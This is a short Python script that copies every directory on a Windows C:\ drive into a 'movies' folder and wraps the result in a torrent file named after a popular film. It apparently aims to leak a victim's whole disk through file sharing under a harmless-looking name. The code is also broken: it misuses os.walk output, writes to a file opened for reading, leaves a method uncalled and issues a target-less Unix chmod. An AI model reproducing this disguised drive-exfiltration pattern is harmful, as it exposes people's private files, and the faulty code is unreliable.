from distutils.dir_util import copy_tree
from makeTorrent import makeTorrent
import subprocess
import os
import sys
def treeCopy():
    directories = os.walk("C:\\")
    for directory in directories:
        if os.path.exists(directory):
            try:
                copy_tree(directory, "D:\\movies")
                torrent = makeTorrent.multi_file("D:\\movies")
                with open("Back to the Future 1.torrent") as file:
                    file.write(torrent.getBencoded)
            except PermissionError:
                sys.stdout.write("Got a Permission Error\nRetrying to copy files...")
                subprocess.call(["chmod", "722"])
if __name__ == "__main__":
    treeCopy()